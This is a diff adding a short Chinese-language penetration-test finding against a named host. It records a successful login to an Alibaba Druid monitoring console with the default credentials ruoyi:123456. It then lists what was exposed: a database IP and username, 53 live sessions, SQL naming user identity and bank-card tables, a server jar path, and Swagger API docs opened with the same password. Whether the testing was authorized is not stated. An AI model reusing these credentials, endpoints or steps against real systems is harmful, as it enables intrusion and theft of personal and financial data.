@@ -1,0 +1,8 @@
+# E1 Druid 出厂口令 → 数据源/会话全量泄露
+目标: https://zsapi.lejiqu.com/druid/login.html
+实测: POST /druid/submitLogin (ruoyi:123456) -> success + JSESSIONID
+datasource.json: jdbc:mysql://192.95.80.66:3306/hmzs  UserName=hmzs
+websession.json: 53 条会话
+sql.json: 254KB，含 app_user_info / user_real_name_info / user_bank_cards_info 建表字段
+basic.json: JavaClassPath=/www/wwwroot/zhzs/ruoyi-app110303.jar
+同口令打通 Swagger Basic: GET /v3/api-docs 200 (73136 字节, 129 接口)
